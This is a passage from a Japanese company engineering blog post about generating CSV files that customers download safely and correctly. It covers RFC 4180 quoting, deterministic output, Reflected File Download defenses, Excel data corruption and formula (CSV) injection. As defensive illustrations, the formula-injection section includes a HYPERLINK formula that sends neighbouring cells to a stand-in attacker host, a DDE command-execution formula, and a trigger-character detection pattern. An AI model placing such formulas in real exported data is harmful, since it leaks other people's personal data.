# はじめに

こんにちは、Dress Code でプロダクトエンジニアをしている [ないとー](https://x.com/_bwkw_) です！

私たちは [DRESS CODE](https://www.dress-code.com/ja) という、人事・情報システム・総務・採用・コーポレートなど複数の部門を横断する業務 OS として機能する、グローバル向けのコンパウンドプロダクトを開発しています。

![事業ドメイン](/images/csv-for-customers/business-domain.png)

扱うドメインが広いと、データを CSV でやり取りする機会が驚くほど多くなります。以前、各国の拠点から **アップロードされる** CSV を正しく読む話を書きました。

https://zenn.dev/dress_code/articles/chardet-high-byte-ratio

今回はその逆方向、人事データを顧客向けに CSV として **配布する** 側で踏んだ罠の話です。これは DRESS CODE に限らず、請求書の明細、売上レポート、会員リストなど、何かを CSV でダウンロードさせるプロダクトなら、どこでも待ち受けている罠だと思います。

「CSV なんて値をカンマで `join` すれば終わりでしょ」。そう思われがちなフォーマットです。ところが「カンマで区切る」の一歩先に進んだ途端、フォーマットそのものの罠と、顧客が Excel で開くという現実の罠が、次々と現れました。しかもその中には、こちらが完璧な CSV を出力しても発火する **攻撃** まであります。おまけに、正しく安全に作れたファイルでさえ、配り方ひとつで攻撃に使われうる。CSV は、それくらい奥行きのあるフォーマットでした。

この記事では、それらの罠を **見取り図** で整理します。同じように CSV を配る側に回って戸惑っている方の、迷ったときに開ける地図になれば幸いです👋

# 罠の見取り図

最初に全体像を置きます。顧客に配る CSV の罠は、ファイルが **作られ、配られ、そして顧客の Excel で開かれる** という旅のどこかで顔を出します。きれいに排他的な分類ではありませんが、どの段で起きる罠かを意識すると、生成側で直すのか・仕様で伝えるのかの判断がぶれにくくなります。

| 段       | 罠の分類                 | 罠の正体                                                       | 誰の挙動か           | 生成側で直せるか               |
| -------- | ------------------------ | -------------------------------------------------------------- | -------------------- | ------------------------------ |
| 作る     | **フォーマット**         | クォート漏れ・改行コード・出力の非決定性                       | CSV 規格（RFC 4180） | ◎ 完全に直す                   |
| 配る     | **配信**                 | Reflected File Download・MIME 誤認・ファイル名インジェクション | ブラウザ・HTTP       | ◎ 配信ヘッダで防ぐ             |
| 開かれる | **表計算ソフト（破損）** | 先頭ゼロ・指数表記・日付化・SYLK 誤認・文字化け                | Excel の自動変換     | △ 一部のみ。多くは仕様で伝える |
| 開かれる | **攻撃**                 | CSV インジェクション（数式インジェクション）                   | Excel の数式評価     | ◎ 無害化する                   |

「開かれる」段に Excel が二度出てくるのは偶然ではありません。顧客が CSV を Excel でダブルクリックした瞬間、Excel は値を **勝手に変換して壊し**（データ破損）、ときに **数式として実行する**（攻撃）という二つの顔を見せます。以降、この旅の順に、作る → 配る → 開かれる、とたどっていきます。

# CSV はカンマ区切りではない

まずは **作る** 段、フォーマットそのものの正しさからです。いちばん素朴な実装はこうです。

```ts
const line = cells.join(",");
```

これは、セルにカンマと改行が絶対に出てこない前提でしか動きません。しかし人名には `山田, 太郎` のようにカンマを含む表記があり、住所やコメントには改行が入ります。`join(',')` は、カンマが現れれば余計な区切りができて列がずれ、改行が現れれば 1 件のはずのレコードが複数行に割れて、その瞬間に壊れます。

CSV の事実上の標準である [RFC 4180](https://www.rfc-editor.org/rfc/rfc4180.html) は、この問題に四つのルールで答えています。

- フィールドは二重引用符で囲んでよい
- カンマ・改行を含むフィールドは、二重引用符で囲まなければならない
- フィールド内の二重引用符は、二重引用符二つ（`""`）でエスケープする
- レコード区切りは CRLF（`\r\n`）

ここで実装は二通りに分かれます。カンマや引用符を含むセルだけ条件付きでクォートするか、全セルを無条件でクォートするか。後者を選びました。

```ts
function serializeRow(cells: readonly string[]): string {
  return cells.map((c) => `"${c.replace(/"/g, '""')}"`).join(",");
}
```

条件付きクォートは、カンマを含むか・引用符を含むか・改行を含むか・先頭末尾に空白があるか、と判定が増え、その分岐漏れがそのままバグになります。全セルクォートなら、エスケープ規則は内部の `"` を `""` にする一点だけ（たとえば `5'10"` は `"5'10"""`）になり、出力が常に一意に定まります。

:::message
RFC 4180 では、クォートの外側の空白もフィールドの一部とみなされます。`"text" , next` と `"text",next` は別物です。全セルクォートにしておくと、この種の曖昧さも最初から発生しません。
:::

ちなみに、CSV がいかに単純ではないかは、有名な [Falsehoods Programmers Believe About CSVs](https://donatstudios.com/Falsehoods-Programmers-Believe-About-CSVs) がよくまとめています。すべての行が同じ列数を持つ、すべての CSV にヘッダがある、改行で行を分割できる。どれも CSV では成り立ちません。そもそも RFC 4180 自体、新しい標準を定めた規格ではなく、「すでに多くの実装が従っている形式を記述した」だけの情報提供の文書です。唯一の正解を決めたものではないため、現実にはこれに従わない無数の方言が存在します。

## 改行コードという地味な沼

「区切りは CRLF」と一言で言っても、現実はそう単純ではありません。

多くのパーサは LF だけでも受け付けますが、CR 単独は古い Mac 由来で、対応していないパーサだと全体が一行になります。実際、Excel for Mac が CR 区切りで吐く時期がありました。フィールド内部に改行が入る住所やコメントもあり、これを行区切りと誤認しないために、引用符の内側では改行をただの文字として扱う状態機械が要ります。

地味に悩ましいのが、最終レコードのあとの CRLF です。付けないと厳格なパーサが最終行を落とし、付けると別のパーサが「空行が一つある」と解釈します。そこで、書くときは末尾にも CRLF を付け、自分で読み戻すときは末尾 CRLF の有無どちらも許容する、という非対称なルールにしました。

```ts
export function serializeCsv(
  header: readonly string[],
  rows: readonly Readonly<Record<string, string>>[]
): string {
  const lines = [serializeRow(header)];
  for (const row of rows) {
    lines.push(serializeRow(header.map((col) => row[col] ?? "")));
  }
  // 末尾にも CRLF を付与し、厳格なパーサーでの最終行欠落を防ぐ。
  // parse 側は末尾 CRLF の有無いずれも許容するため、自分の出力は損失なく読み戻せる。
  return lines.join("\r\n") + "\r\n";
}
```

ここで守りたかったのが「**往復不変**」という性質です。正しいシリアライザは、自分が書いたものを損失なく読み戻せます。この往復不変をテストで固定しておくと、エスケープや改行まわりの修正でデグレが起きてもすぐ気づけます。

## 同じ入力からは、同じバイト列を返す

「往復不変」と対になるもう一つの性質が「**決定性**」、つまり同じ入力からは毎回まったく同じバイト列が出ること（**byte-identical**）です。目立ちませんが、配布する CSV ではこれが効きます。

配布物は一度作って終わりではありません。顧客が最新版を再依頼すれば作り直しますし、バッチが落ちればリトライで再実行されます。このとき出力が毎回ブレると、何が起きるか。

- 内容が同じはずの再生成で差分が出て、前回からの変化を追えなくなる
- ハッシュで「中身が同じファイルは再配信しない」といった最適化ができない
- 「このバグ修正で出力は変わっていない」をテストで保証できない

逆に出力が決定的なら、「再実行しても 1 バイトも変わらない」ことそのものを検証に組み込めます。再生成後の出力の `sha256` が一致することをテストで固定しました。

```ts
it("同じ入力なら再実行しても byte-identical（sha256 一致）", () => {
  const a = serializeCsv(header, rows);
  const b = serializeCsv(header, rows);
  expect(sha256(a)).toBe(sha256(b));
});
```

このテストが通る条件は、突き詰めると **シリアライザが純粋関数であること** 一点に尽きます。同じ引数なら同じ文字列を返し、実行時刻・ロケール・`Map` の列挙順・浮動小数の表現ゆれ・環境変数といった外部状態に一切依存しない。決定性が崩れるのは、たいていこの隠れた非決定性が紛れ込んだときです。行の順序が DB の取得順任せになっていれば明示的に整列し、整形が実行環境のロケール依存ならフォーマットを固定し、列の並びがデータ由来ならヘッダ配列を唯一の列順の源にします。

ちなみに、この「同じ入力からは同じ出力」という発想は、CSV に限った話ではありません。ソフトウェア全体では Reproducible Builds として運動になっています。

https://reproducible-builds.org/docs/definition/

同じソースコード・ビルド環境・手順からは、誰がビルドしても **ビット単位で同一の成果物** が得られるべきだ、という考え方です。もともとは Tor や Debian が、ビルドプロセスそのものへの攻撃（正規のソースから不正なバイナリが作られていないか）を検証可能にするために推し進めてきたものです。配布する CSV のバイト一致をテストで担保するのは、これと同じ精神を「ファイル生成」という小さなスケールでやっているにすぎません。出力が決定的であることは、再現性と検証可能性の土台になります。

ただ、決定性は最初から狙って手に入るものではなく、副作用と暗黙の順序依存を一つずつ潰した結果として後からついてきます。最初は普通に動いていた出力が、ある日「並びが変わった」と気づくところから始まることが多いので、早めにテストで固定しておくのがおすすめです。

正しく、そして決定的に作れたら、次はそのファイルを顧客の手元へ **配る** 番です。ところが、届け方そのものが次の攻撃面になります。

# 配り方そのものが、攻撃面になる

**配る** 段です。正しいフォーマットで作れても、CSV のダウンロードは最後に「ファイルを HTTP レスポンスとして返す」一歩を伴います。このやり取り自体が、中身とは別の攻撃面になります。

## Reflected File Download という攻撃

Reflected File Download（RFD）は、2014 年に Oren Hafif が公表した攻撃で、CSV や JSON を返すエンドポイントが狙われます。

https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/reflected-file-download-a-new-web-attack-vector/

攻撃者は、リクエストに含めた値をレスポンスへ反映するエンドポイントに対し、`.../download/setup.bat` のような実行可能な拡張子に見えるパスと、`=cmd|...` のようなコマンド片を仕込んだ URL を被害者に踏ませます。ブラウザがそれをファイルとしてダウンロードし、被害者が実行すると、正規ドメインから配られた信頼できるファイルの顔をしてコマンドが走ります。

ポイントは、ファイルの中身が正しい CSV であっても、**ブラウザがそれをどう扱うか** で被害が決まるという点です。中身をどう作るかとは別に、配信側の防御が要ります。

## 配信ヘッダで「これはダウンロードだ」と言い切る

私たちは配布物を S3 の presigned URL で配信していますが、その際 `Content-Disposition` を **既定で `attachment`** にしています。

```ts
// 既定で attachment。ブラウザは「表示」ではなく「ダウンロード」として扱う
let contentDeposition = p.contentDeposition || "attachment";
```

`attachment` を明示すると、ブラウザはレスポンスをインライン表示せず、こちらが指定したファイル名でダウンロードします。これが二つの穴を同時に塞ぎます。RFD に対しては、ファイル名と扱いをこちらが握ることで、攻撃者が拡張子やコンテンツを反映して実行ファイルに見せる余地を減らせます。もう一つ、`<script>` を含む CSV をブラウザが `text/html` と誤認（MIME スニッフィング）して描画し、反射型 XSS になる経路も、ダウンロード扱いに固定することで避けられます。

## ファイル名は RFC 5987 でエンコードする

配布物のファイル名は `給与明細_2025.csv` のように非 ASCII を含みます。これを素朴に `Content-Disposition` へ埋め込むと、文字化けするだけでなく、ファイル名に改行が混じれば **ヘッダインジェクション** の入口にもなります。[RFC 6266](https://datatracker.ietf.org/doc/html/rfc6266)（および非 ASCII の符号化を定める [RFC 5987](https://datatracker.ietf.org/doc/html/rfc5987)）は、非 ASCII を含むファイル名は `filename*` で UTF-8 パーセントエンコードして渡すと定めています。

```ts
const hasNonAscii = /[^\x00-\x7F]/.test(filename);
if (hasNonAscii) {
  // RFC 5987: filename*=UTF-8''<percent-encoded>
  contentDeposition += `; filename*=UTF-8''${encodeURIComponent(filename)}`;
} else {
  contentDeposition += `; filename="${filename}"`;
}
```

`encodeURIComponent` は多バイト文字をパーセントエンコードすると同時に、改行や引用符といったヘッダを壊す文字も無害化します。日本語ファイル名の文字化け対策と、ヘッダインジェクション対策が、ここで一挙に片付きます。

## URL そのものを資格情報として扱う

presigned URL は、それを知っていれば誰でもダウンロードできる、実質的な資格情報です。なので発行する URL は短命（既定 30 秒）にし、さらに最高機密区分のファイルには presigned URL を一切発行せず、認証を挟むバックエンド API 経由でのみ取得させる、という線引きにしています。中身と配信ヘッダを固めても、リンクが長時間生きていれば漏洩経路になるからです。

ただ、OWASP は `Content-Disposition` と併せて [`X-Content-Type-Options: nosniff`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options) も推奨していますが、S3 の presigned URL ではレスポンスの `Content-Type` や `Content-Disposition` は上書きできても、`nosniff` のような任意ヘッダは付けられません。私たちは `attachment` と正しい `Content-Type` で代替し、自前のバックエンドを経由して配信する経路では `nosniff` も付ける、という方針にしています。配信を CDN やプロキシに寄せる場合は、そこでヘッダを付与できないかが次の検討先です。

こうして正しく作り、安全に配ったファイルを、顧客の多くは最後に Excel でダブルクリックします。旅の終点であり、最大の関門です。

# 顧客は Excel で開く（データが壊れる）

**開かれる** 段、ここからが本番です。届いた CSV を顧客が Excel でダブルクリックした瞬間から、RFC 4180 とは無関係な Excel 独自の解釈との戦いが始まります。やっかいなのは、これから挙げる罠の多くが **私たちの出力のバグではなく、Excel の仕様** だという点です。まずは「データが勝手に壊れる」系から、影響の大きい順に並べます。

## 先頭が `ID` だと CSV ではなく SYLK と誤認される

ファイルの先頭二文字が大文字の `ID` だと、Excel はそれを CSV ではなく [SYLK（Symbolic Link）形式](https://en.wikipedia.org/wiki/Symbolic_Link_%28SYLK%29) と誤認します。「ファイル形式が正しくありません」といった [エラーダイアログが出て、バージョンによってはそのまま読み込みに失敗します](https://learn.microsoft.com/en-us/answers/questions/3764f46e-52de-49f2-a77a-21ab9cf84f75/sylk-error-when-opening-csv-files-in-excel)。

なぜ `ID` なのか。SYLK は 1982 年に Multiplan（Excel の前身となった表計算ソフト）とともに登場した、古いデータ交換形式です。その仕様では、ファイル先頭の `ID` レコードが形式とバージョンを示す識別子と決められています。CSV の先頭列名をクォート無しの `ID` にすると、この最初の 2 バイトが SYLK の識別子とたまたま一致してしまいます。厄介なのは、SYLK が 1986 年以降ほとんど更新されておらず、Microsoft は仕様を正式に公開すらしていないのに、その遺物がいまだに現代の CSV を **先頭 2 文字だけで** 乗っ取ってくる点です。40 年前のフォーマットの亡霊のような挙動と言ってもいいでしょう。

回避策としてよく挙がるのは「列名を小文字の `id` にする」ですが、私たちの配信 CSV ではこれが使えません。配布物の列名は **顧客が指定したスキーマ** に合わせて出力するので、相手が先頭列を `ID` と決めれば、こちらで小文字に変える余地がないからです。

救ってくれたのは、フォーマットの章で選んだ **全セルクォート** でした。先頭列名が `ID` でも、出力は `"ID"` から始まるので、ファイルのバイト列は `ID` で始まりません。SYLK の誤検知は「クォート無しの先頭フィールド名が `ID`」のときに起きるので、ヘッダも含めて必ずクォートしていれば、顧客がどんな列名を指定しても自動的に避けられます。RFC 4180 のために選んだ全セルクォートが、Excel 固有のこの罠まで同時に塞いでいました。

## 先頭ゼロが消える、長い数字が指数表記になる

Excel は数値っぽいセルを General 形式で取り込むため、社員番号 `00123` の先頭ゼロは落ちて `123` になります。さらに長い数値は、[Microsoft 自身が「16 桁目以降はゼロに変わる」と明記している](https://learn.microsoft.com/en-us/office/troubleshoot/excel/last-digits-changed-to-zeros)とおり、`1.23457E+17` のような指数表記に化けます。これは Excel のバグではなく、内部表現が IEEE 754 の倍精度浮動小数点で、有効桁が 15 桁に制限されることに起因します。Microsoft のドキュメントも「これは IEEE 754 仕様への準拠の結果であり、他の表計算ソフトでも同様に起こる」と説明しています。電話番号やマイナンバー的な長い ID は、ほぼ確実に壊れます。

なお、SYLK 誤認はクォートで防げましたが、こちらは **クォートしても防げません**。Excel はダブルクリックで開く際、クォートの有無に関係なくセルを数値として解釈するからです。`="00123"` のような数式テキストにすれば文字列固定はできますが、それは値そのものを書き換えてしまい、プログラムで読み込む側にはノイズになります。なので、これは生成側で無理に直すものではなく、Excel の取り込み設定に委ねる領域だと整理しています（詳しくは後述します）。

:::message
近年の Excel（Windows 版 2309 以降、Mac 版 16.77 以降）には「自動データ変換」を個別にオフにする設定が追加され、先頭ゼロの除去や日付化を止められるようになりました。ただし、これはあくまで開く側のローカル設定です。不特定多数に配る前提では、受信者全員がオンにしているとは仮定できず、そもそもダブルクリックで開く人が大半なので、生成側の対策の代わりにはなりません。
:::

## 日付に勝手に変換される

`2025-3-1` のような文字列は日付に、`SEPT1` のような値すら日付（9 月 1 日）として解釈されることがあります。これは遺伝子名が Excel で日付化される問題として有名で、[2021 年の調査では、遺伝子リストを含む論文の補足ファイルの実に 30.9% で名前が壊れていた](https://journals.plos.org/ploscompbiol/article?id=10.1371/journal.pcbi.1008984)と報告されています。最終的には、ソフトを直すのではなく **遺伝子名のほうを改名する** 判断が下り、`SEPT1` は `SEPTIN1` に、`MARCH1` は `MARCHF1` に変わりました。データを守るために命名規則そのものを変えた、CSV の自動型推論がいかに根深いかを示す事件です。

## UTF-8 は BOM がないと文字化けする

少し前提から説明します。テキストファイルには「どの文字コードで書かれているか」という情報がそれ自体には含まれていません。`あ` という 1 文字でも、UTF-8 と Shift_JIS では並ぶバイトが違うのに、ファイルには「これは UTF-8 です」と書く欄がないのです。そこで、ファイルの先頭にだけ忍ばせる小さな目印が **BOM（Byte Order Mark）** です。UTF-8 の BOM は `EF BB BF` という 3 バイトで、画面には表示されませんが、「このファイルは UTF-8 ですよ」という宣言として機能します。

問題は、Excel が **BOM のない UTF-8 ファイルを開くと、文字コードを推測で決めてしまう** 点です。日本語版 Windows では、UTF-8 のつもりのファイルを Shift_JIS（ANSI）と勘違いし、日本語が文字化けします。先頭に BOM を付けておけば、Excel は「UTF-8 だ」と正しく判断します。

ところが BOM は万能ではありません。BOM はあくまで余分な 3 バイトなので、BOM を知らない（取り除いてくれない）ツールでファイルを読むと、先頭列名の頭に `﻿` のような見えない・あるいは文字化けした文字が紛れ込みます。Excel に優しい出力（BOM あり）と、その他のツールに優しい出力（BOM なし）が、ここで真っ向から対立します。

私たちはこれを、BOM を常に付けるのではなく、**出力エンコーディングが UTF-8 のときだけ付ける** という条件付きの判断にしています。

```ts
stringify({
  bom: encoding === TextEncoding.UTF8, // UTF-8 のときだけ BOM
  record_delimiter: "\r\n", // RFC 4180 の CRLF
  quoted: true, // 全セルクォート
});
```

ダウンロード時にエンコーディング（UTF-8 / Shift_JIS など）を選べるようにし、BOM はその選択に従属させる。文字化けは生成側で完全には消せませんが、この一行で Excel 利用者の体感はかなり改善します。

## この種の罠は、どこまで生成側で直せるのか

ここまでの罠を一望にすると、こうなります。

| 罠                    | 何が起きる                         | 主な原因                      | 生成側で直せるか                     |
| --------------------- | ---------------------------------- | ----------------------------- | ------------------------------------ |
| `ID` で始まる先頭列名 | ファイルが SYLK と誤認され開けない | Excel の形式判定              | ◎ 全セルクォートで回避               |
| 先頭ゼロの消失        | `00123` → `123`                    | General 形式での取り込み      | × インポート設定の領域               |
| 指数表記化            | 15 桁超 → `1.23E+17`               | 数値精度の制約                | × インポート設定の領域               |
| 日付自動変換          | `SEPT1` などが日付に               | 値の自動型推論                | × インポート設定の領域               |
| 文字化け              | 非 ASCII が壊れる                  | BOM なし UTF-8 を ANSI 誤判定 | ○ 条件付き BOM／エンコーディング選択 |

同じ表計算ソフト起因でも、対処できる度合いはまちまちです。SYLK 誤認と文字化けは、フォーマットの章で決めた全セルクォートと条件付き BOM で、生成側からそのまま潰せます（表の ◎ / ○）。一方で × を付けた三つ、先頭ゼロ・指数表記・日付化は、**生成側では完全には直せません**。最終的には Excel のインポート設定の領域で、ダブルクリックで開かれた瞬間の挙動までは制御できないからです。これらは生成側の責任の外と整理していて、本来は取り込み手順として顧客に案内したいところ、ここは今後の課題でもあります。

ここまでの罠は、程度の差はあれ「データが壊れる」話でした。ところが同じ Excel で開く瞬間には、もう一段たちの悪い罠があります。データが壊れるどころか、**攻撃に使われる** ものです。

# 顧客は Excel で開く（コードが走る）

CSV インジェクション、別名 Formula Injection です。

Excel や LibreOffice Calc は、セルの値が `=` `+` `-` `@` で始まると、それをデータではなく **数式** として評価します。これは怪しいファイルを開いたときの話ではありません。正規の手順で配布された正しい CSV を、正規のアプリでダブルクリックしただけで起きます。

攻撃の流れを具体的に追います。たとえば氏名欄に、次の文字列を登録しておきます。

```
=HYPERLINK("http://evil.example/?leak="&A1&A2,"重要なお知らせ")
```

アプリ上では、ただの変な名前でしかありません。ところがこの人物データが CSV にエクスポートされ、顧客や別部署の管理者がそれを Excel で開いた瞬間、セルはハイパーリンクに化けます。クリックすれば、`A1` と `A2`、つまり同じシートに並んだ **他人の個人情報** がクエリ文字列に連結されて、攻撃者のサーバへ送られます。攻撃者は自分のデータを 1 行仕込むだけで、被害者の画面で他人のデータを抜くトリガーを引けるわけです。

数式の種類によって、到達できる先も変わります。

- `=HYPERLINK(...)` はクリックで任意 URL へ飛ばす。最も手軽な情報持ち出し
- `=IMPORTXML(...)` や `=WEBSERVICE(...)`（Google スプレッドシートや旧 Excel 系）はクリックすら不要でリモートへ HTTP リクエストを飛ばす
- `=cmd|'/c calc'!A1` という [DDE](https://learn.microsoft.com/en-us/security-updates/securityadvisories/2017/4053440) 経由は、警告ダイアログを越えれば OS コマンド実行にまで届きうる（現在の Excel では既定で無効化されています）

OWASP も CSV Injection として攻撃手法に位置づけています。

https://owasp.org/www-community/attacks/CSV_Injection

この罠が手強いのは、次の二点です。

第一に、これは私たちのバグではなく、CSV を開くアプリ側の仕様です。RFC 4180 を完璧に守って出力しても発火します。RFC 4180 が規定するのは「区切り・クォート・改行をどう **パース** するか」という構文の話だけで、パースし終わったセルの中身を数式として評価するかどうかは、完全に規格の外、アプリの裁量だからです。両者は直交していて、フォーマットの正しさは安全性を一切保証しません。

第二に、全セルクォートでは防げません。Excel はクォートを外してからセルの中身を評価するので、`"=cmd"` と書いても `=cmd` として発火します。RFC 4180 のクォートは「区切り文字としてのカンマや改行」を無害化する仕組みであって、「数式としての `=`」には何の効力もないのです。

では、どう防ぐか。防御は **二つの問い** に分けると整理できます。**何を無害化するか**、そして **どこで無害化するか**。この二つを混ぜて考えると事故ります。順番に詰めていきます。

## 入口を特定する: 型に応じた文字列化

まず、その `=HYPERLINK(...)` という文字列は、どの瞬間に CSV へ流れ込むのか。私たちの CSV エクスポートには、全機能が共有する「1 セル分の値を作る」共通処理（仮に `buildValue()` と呼びます）がありました。DTO のプロパティを、型に応じて文字列化するだけの素直な関数です。

```ts
buildValue(record: Dto): string {
  const raw = record[this.propertyKey];
  return match(raw)
    .with(P.nullish, () => '')
    .with(P.string, (s) => String(s))   // 攻撃者が自由入力した文字列がここを素通りする
    .with(P.number, (n) => String(n))
    .with(P.boolean, (b) => String(b))
    .otherwise(() => formatDateOrJoin(raw));
}
```

問題は `P.string` の分岐です。文字列フィールドである氏名・住所・備考・部署名は、ユーザーが自由に入力し、私たちが DB に保存し、エクスポートでそのまま吐き出す値です。攻撃者がコントロールできる値が、型変換を素通りして CSV のセルになります。`buildValue()` は「型を文字列にする」関数であって、「安全な CSV セルにする」関数ではありませんでした。この **責務の取り違え** が、数式インジェクションの入口です。

## 何を無害化するか: トリガー文字を正確に定義する

OWASP が推奨する定番の対策は、危険な先頭文字を持つセルに `'`（シングルクォート）を前置して、表計算ソフトに「これは数式ではなく文字列だ」と認識させることです。問題は、危険な先頭文字を正確に列挙できるか。これが想像以上に広いのです。

OWASP が挙げる基本のトリガーは `=` `+` `-` `@` の四つです。多くの記事はここで止まりますが、現実にはこれだけでは穴が残ります。塞いだ穴は二つありました。

一つ目は、**先頭の空白でトリガー判定をずらす回避** です。一部の表計算ソフトは、セルの中身を評価する前に先頭の空白を除去します。すると先頭が半角スペースの `␣=cmd` は、判定を `=` ではなく空白で受けてすり抜け、評価時には空白が取れて `=cmd` として発火します。対象にすべきはトリガー四文字だけでなく、空白始まり全般です。しかも空白はタブ・改行・NBSP（U+00A0）・全角スペース（U+3000）など多種にわたるので、一文字ずつ列挙するのではなく Unicode の空白クラス（JS なら `\s`）でまとめて拾います。

二つ目は、**全角の数式トリガ** です。日本語環境では、IME 経由で `＝`（U+FF1D）`＋`（U+FF0B）`－`（U+FF0D）`＠`（U+FF20）といった全角記号が入力値に紛れます。これら自体を評価しない表計算ソフトもありますが、コピー&ペーストや NFKC 正規化の過程で半角へ化ける経路があるため、保守的に全角トリガも対象に含めました。

ここまでをコードにすると、こうです。

```ts
/** 数式トリガとなる先頭文字（ASCII と全角）。 */
const FORMULA_TRIGGER = /^[=+\-@＝＋－＠]/u;
/** 先頭が空白（タブ・改行・NBSP・全角スペース等、Unicode の空白全般）。 */
const LEADING_WHITESPACE = /^\s/u;
```

## やりすぎない: 正当な数値だけは素通しする

ところが、この判定には逆方向の見落としがありました。`-` で始まる値を一律に無害化すると、`-100` のような正当な負数まで `'-100` に化けてしまうのです。私たちのプロダクトは人事・給与を扱うので、控除や調整額の負数は日常的に出てきます。安全のためにこれらを全部 `'` 付きの文字列にしたら、それはそれで配布物のデータ破損です。

手がかりになるのは、「危険な先頭文字を持つ」ことと「数式として悪用できる」ことが **似て非なる集合** だという点です。`-100` は `-` で始まりますが、`(` も英字も関数名も含まないので、どう転んでも数式として評価されようがありません。Excel もただの数値として表示するだけです。そこで、「厳密な数値リテラルにマッチする値だけは無害化しない」という例外を入れました。

```ts
/** 符号・小数・指数のみからなる厳密な数値。これに合致する値は数式化されえない。 */
const NUMERIC_LITERAL = /^[+-]?(?:\d+\.?\d*|\.\d+)(?:[eE][+-]?\d+)?$/;

/**
 * @see https://owasp.org/www-community/attacks/CSV_Injection
 */
export function neutralizeCsvFormula(value: string): string {
  if (NUMERIC_LITERAL.test(value)) return value; // -100, +5, -1.5e3 は素通し
  if (FORMULA_TRIGGER.test(value) || LEADING_WHITESPACE.test(value)) {
    return `'${value}`;
  }
  return value;
}
```

判定の順序が大事で、数値リテラルの素通しを先に置きます。`-100` はトリガー判定より先に「純粋な数値だ」と確定させて素通しし、`-1+1` のように評価すれば数式になりうる値はトリガーで捕まえて無害化する。「先頭文字が危険か」ではなく「評価して数式になりうるか」で線を引くのが、この関数の設計です。安全側に倒しすぎればデータが壊れ、倒さなすぎれば攻撃が通る。その境界を、絶対に安全と言い切れる数値リテラルという集合で切り分けています。

:::message
無害化は先頭への `'` 前置にすぎず、本質的にヒューリスティックです。[OWASP の Web Security Testing Guide も「すべての表計算ソフトと下流の取り込みに安全な、万能のサニタイズは存在しない」と明言している](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/21-Testing_for_CSV_Injection)とおり、表計算ソフトは保存・再オープンの過程でクォートを外すこともあり、完全な防御ではありません。理想を言えば、入力時に数式を弾く防御も重ねたいところですが、氏名や備考のような自由入力フィールドは記号始まりの正当な値も受け付ける必要があり、入力時点で機械的に弾くのは現実的ではありません。そこで、入口を絞るのではなく、人が開く配布物を書き出す出口で無害化することを主防御に据えています。
:::

## どこで無害化するか: 「人が開く終端」だけに効かせる

何を無害化するかが固まったので、次は **どこで** 無害化するか。私が一番ハマったのは、こちらでした。

攻撃者の値が流れ込むのは、前節で見た `buildValue()`、どのエクスポートも共通で通る値生成の処理でした。だったら、この共通処理に無害化を一箇所足せば、40 以上あるエクスポートがまとめて守れるはずです。実際そのとおりで、数式インジェクション自体は確かに塞がりました。

問題は、その共通処理が **人間向けの CSV 専用ではなかった** ことです。私たちのシステムには、CSV をいったん内部ファイルとして書き出し、別の処理がそれをもう一度パースしてドメインに取り込む経路があります。データ連携の中間ファイルで、人間が Excel で開くのではなく、機械が読み戻すための CSV です。そこにも同じ共通処理が通っていて、無害化はそこにも一律に効いてしまいました。

その結果どうなるか。`-100` はリテラル例外で守られても、`=ref` のような記号始まりの正当なコード値には先頭に `'` が付きます。読み戻す側は `'=ref` という汚染された値を受け取り、元の `=ref` には戻せません。安全のための前置クォートが、機械間の往復で **データそのものを変質させて** しまいます。「人が開くから安全側に倒す」という判断が、「機械が読むから忠実性を最優先したい」経路にまで漏れ出した状態でした。

そこで無害化を、この共通の合流点から、**「人が表計算ソフトで開く配布物」だけが通る境界**、つまりエクスポート専用の Transform（仮に `ExportCsvTransform`）へ移しました。

```ts
// ✗ 共通の値生成。機械が読み戻す中間CSVもここを通る。無害化してはいけない
function buildRecord(cells: readonly string[]): string {
  return serializeRow(cells); // 素の値のまま返す
}

// ○ 人間がDLする配布物だけが通る境界。ここでだけ無害化する
class ExportCsvTransform {
  _transform(record: Record<string, string>) {
    const safe = neutralizeCsvFormulaRows([record]); // 適用境界はここ一点
    this.push(serializeRow(buildRow(safe[0])));
  }
}
```

判断の基準はシンプルで、その CSV を最終的に読むのが **人間（表計算ソフトで開く）か、自分たちのプログラム（再パースする）か**、それだけです。人間が開くもの、つまり「**人が開く終端**」にだけ無害化を効かせ、プログラムが読み戻すものには効かせない。同じシリアライザを両方で共有しているからこそ、無害化はその中ではなく、人間向けの出力を書き出す最後の一歩に置く必要がありました。

## ヘッダを無害化してはいけない

出口に置くと決めても、まだ落とし穴があります。値とヘッダのどちらに効かせるか、です。最初、ヘッダも値もまとめて無害化すればいいと考えて、ヘッダ配列にも掛けました。これは壊れます。

理由は、前に出した自前の `serializeCsv` のデータの持ち方にあります。各行は `{ 列名: 値 }` という連想配列で、`serializeCsv` はヘッダ配列に並んだ列名を **キーにして、各行から対応する値を引きます**。ヘッダ配列は「列の並び順」と「行データを引くキー」の二役を兼ねているのです。

```ts
lines.push(serializeRow(header.map((col) => row[col] ?? "")));
//                                       ^^^^^^^ ヘッダ要素をキーに値を引く
```

ヘッダ `=col` を `'=col` に書き換えると、行レコードは元のキー `=col` で値を持っているので、`row['=col']` ではなく `row["'=col"]` を探しに行って空文字になります。ヘッダを無害化した瞬間に、その列の値が全部消えるわけです。

そこで無害化は **行の値だけ** に適用し、ヘッダは据え置くことにしました。ヘッダはこちらが定義する出力列名で、攻撃者が注入できる値ではなく、数式リスクも低いからです。

```ts
export function neutralizeCsvFormulaRows(
  rows: readonly Readonly<Record<string, string>>[]
): Record<string, string>[] {
  return rows.map((row) => {
    const neutralized: Record<string, string> = {};
    for (const [key, value] of Object.entries(row)) {
      neutralized[key] = neutralizeCsvFormula(value); // key は保持、value だけ無害化
    }
    return neutralized;
  });
}
```

テストでは、無害化後も「往復不変」が保たれることと、ヘッダ参照が壊れないことを固定しました。

```ts
it("無害化後も serialize → parse でヘッダ参照が壊れない", () => {
  const header = ["=col", "name"];
  const rows = [{ "=col": "=cmd", name: "taro" }];
  const csv = serializeCsv(header, neutralizeCsvFormulaRows(rows));
  expect(parseCsv(csv)).toEqual({
    header: ["=col", "name"], // ヘッダはそのまま
    rows: [{ "=col": "'=cmd", name: "taro" }], // 値だけ無害化
  });
});
```

ヘッダを除外する話と、機械向け中間 CSV を除外する話は、根が同じです。どちらも「無害化してよいのは、人間が表計算ソフトで開く値だけ」という一本の原則から出てきます。対象を広げるほど安全に見えますが、実際には壊す範囲が広がります。

## 無害化しても、完全ではない

